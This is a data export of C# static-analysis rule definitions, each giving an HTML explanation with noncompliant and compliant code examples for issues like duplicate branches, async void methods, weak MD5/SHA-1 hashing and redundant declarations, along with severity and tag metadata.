118	Two branches in the same conditional structure should not have exactly the same implementation	S1871	\N	csharpsquid	<p>\n    Having two <code>cases</code> in the same <code>switch</code> statement or branches in the same <code>if</code> structure\n    with the same implementation is at best duplicate code, and at worst a coding error. If the same logic is truly needed for\n    both instances, then in an <code>if</code> structure they should be combined, or for a <code>switch</code>, one should fall\n    through to the other.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nswitch (i)\n{\n  case 1:\n    doSomething();\n    break;\n  case 2:\n    doSomethingDifferent();\n    break;\n  case 3:  // Noncompliant; duplicates case 1's implementation\n    doSomething();\n    break;\n  default:\n    doTheRest();\n}\n\nif (a >= 0 &amp;&amp; a < 10)\n{\n  doTheThing();\n}\nelse if (a >= 10 &amp;&amp; a < 20)\n{\n  doTheOtherThing();\n}\nelse if (a >= 20 &amp;&amp; a < 50)\n{\n  doTheThing();  // Noncompliant; duplicates first condition\n}\nelse\n{\n  doTheRest();\n}\n\nif (b == 0)\n{\n  doOneMoreThing();\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nswitch (i) {\n  case 1:\n  case 3:\n    doSomething();\n    break;\n  case 2:\n    doSomethingDifferent();\n    break;\n  default:\n    doTheRest();\n}\n\nif ((a >= 0 &amp;&amp; a < 10) || (a >= 20 &amp;&amp; a < 50))\n{\n  doTheThing();\n}\nelse if (a >= 10 &amp;&amp; a < 20)\n{\n  doTheOtherThing();\n}\nelse\n{\n  doTheRest();\n}\n\ndoOneMoreThing();\n</pre>\nor\n<pre>\nswitch (i)\n{\n  case 1:\n    doSomething();\n    break;\n  case 2:\n    doSomethingDifferent();\n    break;\n  case 3:\n    doThirdThing();\n    break;\n  default:\n    doTheRest();\n}\n\nif (a >= 0 &amp;&amp; a < 10)\n{\n  doTheThing();\n}\nelse if (a >= 10 &amp;&amp; a < 20)\n{\n  doTheOtherThing();\n}\nelse if (a >= 20 &amp;&amp; a < 50)\n{\n  doTheThirdThing();\n}\nelse\n{\n  doTheRest();\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	design,suspicious	f	HTML	1511453806397	1511453806398	1
119	Declarations and initializations should be as concise as possible	S3257	\N	csharpsquid	<p>\n    Unnecessarily verbose declarations and initializations make it harder to read the code, and should be simplified.\n</p>\n<p>\n    Specifically the following should be omitted when they can be inferred:\n    <ul>\n        <li>array element type</li>\n        <li>array size</li>\n        <li><code>new DelegateType</code></li>\n        <li><code>new Nullable&lt;Type&gt;</code></li>\n        <li>object or collection initializers (<code>{}</code>)</li>\n        <li>type of lambda expression parameters</li>\n        <li>parameter declarations of anonymous methods when the parameters are not used.</li>\n    </ul>\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar l = new List&lt;int&gt;() {}; // Noncompliant, {} can be removed\nvar o = new object() {}; // Noncompliant, {} can be removed\n\nvar ints = new int[] {1, 2, 3}; // Noncompliant, int can be omitted\nints = new int[3] {1, 2, 3}; // Noncompliant, the size specification can be removed\n\nint? i = new int?(5); // Noncompliant new int? could be omitted, it can be inferred from the declaration, and there's implicit conversion from T to T?\nvar j = new int?(5);\n\nFunc&lt;int, int&gt; f1 = (int i) => 1; //Noncompliant, can be simplified\n\nclass Class\n{\n  private event EventHandler MyEvent;\n\n  public Class()\n  {\n    MyEvent += new EventHandler((a,b) => { }); // Noncompliant, needlessly verbose\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar l = new List&lt;int&gt;();\nvar o = new object();\n\nvar ints = new [] {1, 2, 3};\nints = new [] {1, 2, 3};\n\nint? i = 5;\nvar j = new int?(5);\n\nFunc&lt;int, int&gt; f1 = (i) => 1;\n\nclass Class\n{\n  private event EventHandler MyEvent;\n\n  public Class()\n  {\n    MyEvent += (a,b) => { };\n  }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	clumsy,finding	f	HTML	1511453806399	1511453806399	1
120	Empty "default" clauses in a "switch" should be removed	S3532	\N	csharpsquid	<p>\n    The <code>default</code> clause should take appropriate action. Having an empty <code>default</code> is a waste of keystrokes.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nenum Fruit\n{\n  Apple,\n  Orange,\n  Banana\n}\n\nvoid PrintName(Fruit fruit)\n{\n  switch(fruit)\n  {\n    case Fruit.Apple:\n      Console.WriteLine("apple");\n      break;\n    default:  //Noncompliant\n      break;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nenum Fruit\n{\n  Apple,\n  Orange,\n  Banana\n}\n\nvoid PrintName(Fruit fruit)\n{\n  switch(fruit)\n  {\n    case Fruit.Apple:\n      Console.WriteLine("apple");\n      break;\n    default:\n      throw new NotSupportedException();\n  }\n}\n</pre>\n<p>or</p>\n<pre>\nvoid PrintName(Fruit fruit)\n{\n  switch(fruit)\n  {\n    case Fruit.Apple:\n      Console.WriteLine("apple");\n      break;\n  }\n}\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	clumsy,finding,unused	f	HTML	1511453806400	1511453806402	1
121	"for" loop incrementers should modify the variable being tested in the loop's stop condition	S1994	\N	csharpsquid	<p>\nIt is almost always an error when a <code>for</code> loop's stop condition and incrementer don't act on the same variable. Even when it is not, it could confuse future maintainers of the code, and should be avoided.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nfor (i = 0; i < 10; j++) // Noncompliant\n{\n  // ...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nfor (i = 0; i < 10; i++)\n{\n  // ...\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	suspicious	f	HTML	1511453806403	1511453806403	1
122	SHA-1 and Message-Digest hash algorithms should not be used	S2070	\N	csharpsquid	<p>\n    The MD5 algorithm and its successor, SHA-1, are no longer considered secure, because it is too easy to\n    create hash collisions with them. That is, it takes too little computational effort to come up with a\n    different input that produces the same MD5 or SHA-1 hash, and using the new, same-hash value gives an\n    attacker the same access as if he had the originally-hashed value. This applies as well to the other\n    Message-Digest algorithms: MD2, MD4, MD6.\n</p>\n\n<p>\n    This rule tracks usage of the <code>System.Security.Cryptography.CryptoConfig.CreateFromName()</code>, and <code>System.Security.Cryptography.HashAlgorithm.Create()</code> methods to instantiate MD5 or SHA-1 algorithms, and of derived class instances of <code>System.Security.Cryptography.SHA1</code> and <code>System.Security.Cryptography.MD5</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar hashProvider1 = new MD5CryptoServiceProvider(); //Noncompliant\nvar hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName("MD5"); //Noncompliant\nvar hashProvider3 = new SHA1Managed(); //Noncompliant\nvar hashProvider4 = HashAlgorithm.Create("SHA1"); //Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar hashProvider1 = new SHA256Managed();\nvar hashProvider2 = (HashAlgorithm)CryptoConfig.CreateFromName("SHA256Managed");\nvar hashProvider3 = HashAlgorithm.Create("SHA256Managed");\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li> <a href="http://cwe.mitre.org/data/definitions/328">MITRE, CWE-328</a> - Reversible One-Way Hash</li>\n    <li> <a href="http://cwe.mitre.org/data/definitions/327">MITRE, CWE-327</a> - Use of a Broken or Risky Cryptographic Algorithm</li>\n    <li> <a href="https://www.owasp.org/index.php/Top_10_2013-A6-Sensitive_Data_Exposure">OWASP Top Ten 2013 Category A6</a> - Sensitive Data Exposure</li>\n    <li> <a href="http://www.sans.org/top25-software-errors/">SANS Top 25</a> - Porous Defenses</li>\n    <li>Derived from FindSecBugs rule <a href="http://h3xstream.github.io/find-sec-bugs/bugs.htm#WEAK_MESSAGE_DIGEST">MessageDigest Is Weak</a></li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	cwe,owasp-a6,sans-top25-porous	f	HTML	1511453806404	1511453806405	3
123	Inheritance list should not be redundant	S1939	\N	csharpsquid	<p>\n    An inheritance list entry is redundant if:\n    <ul>\n        <li>It is <code>Object</code> - all classes extend <code>Object</code> implicitly.</li>\n        <li>It is <code>int</code> for an <code>enum</code></li>\n        <li>It is a base class of another listed inheritance.</li>\n    </ul>\n    Such redundant declarations should be removed because they needlessly clutter the code and can be confusing.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass : Object  // Noncompliant\n\nenum MyEnum : int  // Noncompliant\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class MyClass\n\nenum MyEnum\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	clumsy	f	HTML	1511453806406	1511453806406	1
124	Right operands of shift operators should be integers	S3449	\N	csharpsquid	<p>\n    Numbers can be shifted with the <code>&lt;&lt;</code> and <code>&gt;&gt;</code> operators, but the right operand of the operation needs to be \n    an <code>int</code> or a type that has an implicit conversion to <code>int</code>. However, with <code>dynamic</code>, the compiler's type \n    checking is turned off, so you can pass anything to a shift operator and have it compile. And if the argument can't be converted to \n    <code>int</code> at runtime, then a <code>RuntimeBinderException</code> will be raised.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\ndynamic d = 5;\nvar x = d &gt;&gt; 5.4; // Noncompliant\nx = d &gt;&gt; null; // Noncompliant\nx &lt;&lt;= new object(); // Noncompliant\n</pre>	4	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	10min	\N	\N	\N	f	HTML	1511453806407	1511453806408	2
125	"IDisposables" created in a "using" statement should not be returned	S2997	\N	csharpsquid	<p>\n    Typically you want to use <code>using</code> to create a local <code>IDisposable</code> variable; it will trigger\n    disposal of the object when control passes out of the block's scope. The exception to this rule is when your\n    method returns that <code>IDisposable</code>. In that case <code>using</code> disposes of the object before the\n    caller can make use of it, likely causing exceptions at runtime. So you should either remove <code>using</code> or\n    avoid returning the <code>IDisposable</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic FileStream WriteToFile(string path, string text)\n{\n  using (var fs = File.Create(path)) // Noncompliant\n  {\n    var bytes = Encoding.UTF8.GetBytes(text);\n    fs.Write(bytes, 0, bytes.Length);\n    return fs;\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic FileStream WriteToFile(string path, string text)\n{\n  var fs = File.Create(path);\n  var bytes = Encoding.UTF8.GetBytes(text);\n  fs.Write(bytes, 0, bytes.Length);\n  return fs;\n}\n</pre>	4	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806409	1511453806410	2
126	The ternary operator should not return the same value regardless of the condition	S2758	\N	csharpsquid	<p>\n    When the second and third operands of a ternary operator are the same, the operator will always\n    return the same value regardless of the condition. Either the operator itself is pointless, or a\n    mistake was made in coding it.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic boolean canVote(Person person)\n{\n  return person.getAge > 18 ? true : true; // Noncompliant; is this what was intended?\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic boolean canVote(Person person)\n{\n  return person.getAge > 18 ? true : false;\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806411	1511453806411	2
127	Inappropriate casts should not be made	S1944	\N	csharpsquid	<p>\n    Inappropriate casts are issues that will lead to unexpected behavior or runtime errors, such as\n    <code>InvalidCastException</code>s. The compiler will catch bad casts from one class to another, but not bad casts to\n    interfaces.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface MyInterface\n{ /* ... */ }\n\npublic class Implementer : MyInterface\n{ /* ... */ }\n\npublic class MyClass\n{ /* ... */ }\n\npublic static class Program\n{\n  public static void Main()\n  {\n    var myclass = new MyClass();\n    var x = (MyInterface) myclass; // Noncompliant, InvalidCastException is being thrown\n    var b = myclass is MyInterface; // Noncompliant, always false\n  }\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    No issue is reported if the interface has no implementing class in the assembly.\n</p>\n\n<h2>See</h2>\n<ul>\n    <li>MISRA C:2004, 11.4 - A cast should not be performed between a pointer to object type and an integral type.</li>\n    <li>MISRA C++:2008, 5-2-3 - Casts to a base class from a derived class should not be performed on polymorphic types.</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/tgAV">CERT, EXP36-C.</a> - Do not cast pointers into more strictly aligned pointer types</li>\n    <li><a href="https://www.securecoding.cert.org/confluence/x/j4AyAQ">CERT, EXP56-CPP.</a> - Do not cast pointers into more strictly aligned pointer types</li>\n    <li><a href="http://cwe.mitre.org/data/definitions/588.html">MITRE, CWE-588</a> - Attempt to Access Child of a Non-structure Pointer</li>\n    <li><a href="http://cwe.mitre.org/data/definitions/704.html">MITRE, CWE-704</a> - Incorrect Type Conversion or Cast</li>\n</ul>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	20min	\N	\N	cert,cwe,misra,pitfall	f	HTML	1511453806412	1511453806412	2
128	"=+" should not be used instead of "+="	S2757	\N	csharpsquid	<p>\n    The use of operators pairs (<code>=+</code> or <code>=-</code>) where the reversed, single operator\n    was meant (<code>+=</code> or <code>-=</code>) will compile and run, but not produce the expected results.\n</p>\n<p>\n    This rule raises an issue when <code>=+</code>, and <code>=-</code> are used, but ignores the operators\n    when they're spaced out: <code>= +</code>, <code>= -</code>.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nint target = -5;\nint num = 3;\n\ntarget =- num; // Noncompliant; target = -3. Is that really what's meant?\ntarget =+ num; // Noncompliant; target = 3\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nint target = -5;\nint num = 3;\n\ntarget = -num; // Compliant; intent to assign inverse value of num is clear\ntarget += num;\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	\N	f	HTML	1511453806414	1511453806414	2
129	Redundant property names should be omitted in anonymous classes	S3441	\N	csharpsquid	<p>\n    When an anonymous type's properties are copied from properties or variables with the same names, it yields cleaner code to\n    omit the new type's property name and the assignment operator.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar X = 5;\n\nvar anon = new\n{\n  X = X, //Noncompliant, the new object would have the same property without the "X =" part.\n  Y = "my string"\n};\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar X = 5;\n\nvar anon = new\n{\n  X,\n  Y = "my string"\n};\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	clumsy,finding	f	HTML	1511453806415	1511453806416	1
130	Statements should be on separate lines	S122	\N	csharpsquid	<p>\n    For better readability, do not put more than one statement on a single line.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif(someCondition) doSomething();\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nif(someCondition) {\n  doSomething();\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    Anonymous functions containing a single statement are ignored. Block statements are not considered either.\n</p>\n<pre>\nFunc&lt;object, bool&gt; item1 = o =&gt; { return true; }; // Compliant\nFunc&lt;object, bool&gt; item1 = o =&gt; { var r = false; return r; }; // Noncompliant\n</pre>	1	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1min	\N	\N	convention	f	HTML	1511453806416	1511453806417	1
131	Modulus results should not be checked for direct equality	S2197	\N	csharpsquid	<p>\n    When the modulus of a negative number is calculated, the result will either be negative or zero. Thus, comparing the modulus\n    of a variable for equality with a positive number (or a negative one) could result in unexpected results.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic boo IsOdd(int x)\n{\n  return x % 2 == 1;  // Noncompliant; if x is an odd negative, x % 2 == -1\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic bool IsOdd(int x)\n{\n  return x % 2 != 0;\n}\n</pre>\nor\n<pre>\npublic bool IsOdd(uint x)\n{\n  return x % 2 == 1;\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	suspicious	f	HTML	1511453806418	1511453806418	1
132	"async" methods should not return "void"	S3168	\N	csharpsquid	<p>\n    An async method with a void return type is a "fire and forget" method best reserved for event handlers because there's no way to wait for the method's execution to complete and respond accordingly. There's also no way to catch exceptions thrown from the method.\n</p>\n<p>\n    Having an async void method that is not an event handler could mean your program works some times and not others because of timing issues. Instead, async methods should return Task.\n</p>\n<p>\n    This rule raises an issue when non-event handler methods are both async and void.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nclass HttpPrinter\n{\n  private string content;\n\n  public async void CallNetwork(string url) //Noncompliant\n  {\n    var client = new HttpClient();\n    var response = await client.GetAsync(url);\n    content = await response.Content.ReadAsStringAsync();\n  }\n\n  public async Task PrintContent(string url)  // works correctly if web request finishes in under 1 second, otherwise content will be null\n  {\n    CallNetwork(url);\n    await Task.Delay(1000);\n    Console.Write(content);\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n\n<pre>\nclass HttpPrinter\n{\n  private string content;\n\n  public async Task CallNetwork(string url)\n  {\n    var client = new HttpClient();\n    var response = await client.GetAsync(url);\n    content = await response.Content.ReadAsStringAsync();\n  }\n\n  public async Task PrintContent(string url)\n  {\n    await CallNetwork(url); // &lt;----- call changed here. If await is not added warning CS4014 will be triggered\n    await Task.Delay(1000);\n    Console.Write(content);\n  }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453806419	1511453806420	2
133	Type examining methods should be avoided on "System.Type" instances	S3443	\N	csharpsquid	<p>\n    If you call <code>GetType()</code> on a <code>Type</code> variable, the return value will always be <code>typeof(System.Type)</code>. So there's no real \n    point in making that call. The same applies to passing a type argument to <code>IsInstanceOfType</code>. In both cases the results are entirely \n    predictable.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar type = typeof(int);\nvar ttype = type.GetType(); //Noncompliant, always typeof(System.Type)\n\nvar s = "abc";\n\nif (s.GetType().IsInstanceOfType(typeof(string))) //Noncompliant; false\n{ /* ... */ }\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar s = "abc";\n\nif (s.GetType().IsInstanceOfType("ssss"))\n{ /* ... */ }\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	suspicious	f	HTML	1511453806420	1511453806421	1
134	Unused private types or members should be removed	S1144	\N	csharpsquid	<p>\n    Private types or members that are never executed or referenced are dead code: unnecessary, inoperative code that\n    should be removed. Cleaning out dead code decreases the size of the maintained codebase, making it easier to\n    understand the program and preventing bugs from being introduced.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo\n{\n  private void UnusedPrivateMethod() {...} // Noncompliant\n\n  private class UnusedClass {...} // Noncompliant\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo\n{\n  private Foo()\n  {\n    UsedPrivateMethod();\n  }\n\n  private void UsedPrivateMethod()\n  {\n    var c = new UsedClass();\n  }\n\n  private class UsedClass {...}\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    This rule doesn't raise any issue on empty constructors and attributed members.\n</p>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	unused	f	HTML	1511453806421	1511453806422	1
146	"Object.ReferenceEquals" should not be used for value types	S2995	\N	csharpsquid	<p>\n    Using <code>Object.ReferenceEquals</code> to compare the references of two value types simply won't return the\n    expected results most of the time because such types are passed by value, not by reference.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class MyClass\n{\n  private MyStruct myStruct;\n\n  public void DoSomething(MyStruct s1) {\n    int a = 1;\n    int b = 1;\n\n    if (Object.ReferenceEquals(myStruct, s1))  // Noncompliant; this can never be true\n    {\n      // ...\n    }\n    else if (Object.ReferenceEquals(a,b)) // Noncompliant\n    {\n      // ...\n    }\n  }\n}\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	15min	\N	\N	\N	f	HTML	1511453806442	1511453806442	2
135	Control structures should use curly braces	S121	\N	csharpsquid	<p>\n  While not technically incorrect, the omission of curly braces can be misleading, and may lead to the introduction of errors during maintenance.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\n// the two statements seems to be attached to the if statement, but that is only true for the first one:\nif (condition)\n  executeSomething();\n  checkSomething();\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nif (condition)\n{\n  executeSomething();\n  checkSomething();\n}\n</pre>\n\n<h2>See</h2>\n\n<ul>\n    <li>MISRA C:2004, 14.8 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement</li>\n    <li>MISRA C:2004, 14.9 - An if (expression) construct shall be followed by a compound statement. The else keyword shall be followed by either a compound statement, or another if statement</li>\n    <li>MISRA C++:2008, 6-3-1 - The statement forming the body of a switch, while, do ... while or for statement shall be a compound statement</li>\n    <li>MISRA C++:2008, 6-4-1 - An if (condition) construct shall be followed by a compound statement. The else keyword shall be followed by either a compound statement, or another if statement</li>\n    <li>MISRA C:2012, 15.6 - The body of an iteration-statement or a selection-statement shall be a compound-statement</li>\n    <li> <a href="https://www.securecoding.cert.org/confluence/x/1QGMAg">CERT, EXP19-C</a> - Use braces for the body of an if, for, or while statement</li>\n    <li> <a href="http://cwe.mitre.org/data/definitions/483.html">MITRE, CWE-483</a> - Incorrect Block Delimitation</li>\n</ul>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cert,cwe,misra,pitfall	f	HTML	1511453806423	1511453806424	1
136	Methods should not be too complex	S1541	\N	csharpsquid	<p>The cyclomatic complexity of a function should not exceed a defined threshold.</p>\n<p>Complex code can perform poorly and will in any case be difficult to understand and therefore to maintain.</p>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	1h	\N	\N	brain-overload	f	HTML	1511453806425	1511453806425	1
137	Useless "if(true) {...}" and "if(false){...}" blocks should be removed	S1145	\N	csharpsquid	<p>\n  <code>if</code> statements with conditions that are always false have the effect of making blocks of code non-functional. This can be useful during debugging, but should not be checked in. <code>if</code> statements with conditions that are always true are completely redundant, and make the code less readable.\n</p>\n<p>\nIn either case, unconditional <code>if</code> statements should be removed.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nif (true)\n{\n  doSomething();\n}\n...\nif (false)\n{\n  doSomethingElse();\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\ndoSomething();\n...\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	2min	\N	\N	cwe,misra	f	HTML	1511453806430	1511453806430	2
145	Fields should be private	S2357	\N	csharpsquid	<p>\n    Fields should not be part of an API, and therefore should always be private. Indeed, they\n    cannot be added to an interface for instance, and validation cannot be added later on without\n    breaking backward compatiblity. Instead, developers should encapsulate their fields into\n    properties. Explicit property getters and setters can be introduced for validation purposes\n    or to smooth the transition to a newer system.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic class Foo\n{\n  public int MagicNumber = 42;\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic class Foo\n{\n  public int MagicNumber\n  {\n    get { return 42; }\n  }\n}\n</pre>\nor\n<pre>\npublic class Foo\n{\n  private int MagicNumber = 42;\n}\n</pre>\n\n<h2>Exceptions</h2>\n<p>\n    <code>static</code> and <code>const</code> fields are ignored.\n</p>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	30min	\N	\N	pitfall	f	HTML	1511453806441	1511453806441	1
138	Interfaces with colliding, inherited members should explicitly redefine interface members	S3444	\N	csharpsquid	<p>\n    When an interface <code>IDerived</code> inherits from two interfaces <code>IBase1</code> and <code>IBase2</code> that both \n    define a member <code>SomeProperty</code>, calling <code>IDerived.SomeProperty</code> will result in the compiler error \n    <code>CS0229 Ambiguity between 'IBase1.SomeProperty' and 'IBase2.SomeProperty'</code>.\n</p>\n<p>\n    Every caller will be forced to cast instances of <code>IDerived</code> to <code>IBase1</code> or <code>IBase2</code> to \n    resolve the ambiguity and to be able to access <code>SomeProperty</code>. Instead, it is better to resolve the ambiguity on \n    the definition of <code>IDerived</code> either by:\n    <ul>\n        <li>renaming one of the <code>SomeProperty</code> in <code>IBase1</code> or <code>IBase2</code> to remove the collision</li>\n        <li>or by also defining a new <code>SomeProperty</code> member on <code>IDerived</code>. Use this only if all \n        <code>SomeProperty</code> are meant to hold the same value.</li>\n    </ul>\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic interface IBase1\n{\n  string SomeProperty { get; set; }\n}\n\npublic interface IBase2\n{\n  string SomeProperty { get; set; }\n}\n\npublic interface IDerived : IBase1, IBase2 // Noncompliant, accessing IDerived.SomeProperty is ambiguous\n{\n}\n\npublic class MyClass : IDerived\n{\n  // Implements both IBase1.SomeProperty and IBase2.SomeProperty\n  public string SomeProperty { get; set; } = "Hello";\n\n  public static void Main()\n  {\n    MyClass myClass = new MyClass();\n    Console.WriteLine(myClass.SomeProperty); // Writes "Hello" as expected\n    Console.WriteLine(((IBase1)myClass).SomeProperty); // Writes "Hello" as expected\n    Console.WriteLine(((IBase2)myClass).SomeProperty); // Writes "Hello" as expected\n    Console.WriteLine(((IDerived)myClass).SomeProperty); // Error CS0229 Ambiguity between 'IBase1.SomeProperty' and 'IBase2.SomeProperty'\n  }\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic interface IDerived : IBase1, IBase2\n{\n  new string SomeProperty { get; set; }\n}\n\npublic class MyClass : IDerived\n{\n  // Implements IBase1.SomeProperty, IBase2.SomeProperty and IDerived.SomeProperty\n  public string SomeProperty { get; set; } = "Hello";\n\n  public static void Main()\n  {\n    MyClass myClass = new MyClass();\n    Console.WriteLine(myClass.SomeProperty); // Writes "Hello" as expected\n    Console.WriteLine(((IBase1)myClass).SomeProperty); // Writes "Hello" as expected\n    Console.WriteLine(((IBase2)myClass).SomeProperty); // Writes "Hello" as expected\n    Console.WriteLine(((IDerived)myClass).SomeProperty); // Writes "Hello" as expected\n  }\n}\n</pre>\n<p>or</p>\n<pre>\npublic interface IBase1\n{\n  string SomePropertyOne { get; set; }\n}\n\npublic interface IBase2\n{\n  string SomePropertyTwo { get; set; }\n}\n\npublic interface IDerived : IBase1, IBase2\n{\n}\n</pre>	2	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	design	f	HTML	1511453806431	1511453806431	1
139	Multiple "OrderBy" calls should not be used	S3169	\N	csharpsquid	<p>\n    There's no point in chaining multiple <code>OrderBy</code> calls in a LINQ; only the last one will be reflected in the result\n    because each subsequent call completely reorders the list. Thus, calling <code>OrderBy</code> multiple times is a performance\n    issue as well, because all of the sorting will be executed, but only the result of the last sort will be kept.\n</p>\n<p>\n    Instead, use <code>ThenBy</code> for each call after the first.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\nvar x = personList\n  .OrderBy(person => person.Age)\n  .OrderBy(person => person.Name)  // Noncompliant\n  .ToList();  // x is sorted by Name, not sub-sorted\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\nvar x = personList\n  .OrderBy(person => person.Age)\n  .ThenBy(person => person.Name)\n  .ToList();\n</pre>	3	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	performance	f	HTML	1511453806433	1511453806433	2
140	Parameters should be passed in the correct order	S2234	\N	csharpsquid	<p>\n    When the names of parameters in a method call match the names of the method arguments,\n    it contributes to clearer, more readable code. However, when the names match, but are\n    passed in a different order than the method arguments, it indicates a mistake in the\n    parameter order which will likely lead to unexpected results.\n</p>\n\n<h2>Noncompliant Code Example</h2>\n<pre>\npublic double divide(int divisor, int dividend)\n{\n  return divisor/dividend;\n}\n\npublic void doTheThing()\n{\n  int divisor = 15;\n  int dividend = 5;\n\n  double result = divide(dividend, divisor);  // Noncompliant; operation succeeds, but result is unexpected\n  //...\n}\n</pre>\n\n<h2>Compliant Solution</h2>\n<pre>\npublic double divide(int divisor, int dividend)\n{\n  return divisor/dividend;\n}\n\npublic void doTheThing()\n{\n  int divisor = 15;\n  int dividend = 5;\n\n  double result = divide(divisor, dividend);\n  //...\n}\n</pre>	4	\N	READY	cs	\N	\N	\N	\N	\N	CONSTANT_ISSUE	\N	\N	\N	5min	\N	\N	\N	f	HTML	1511453806434	1511453806434	2
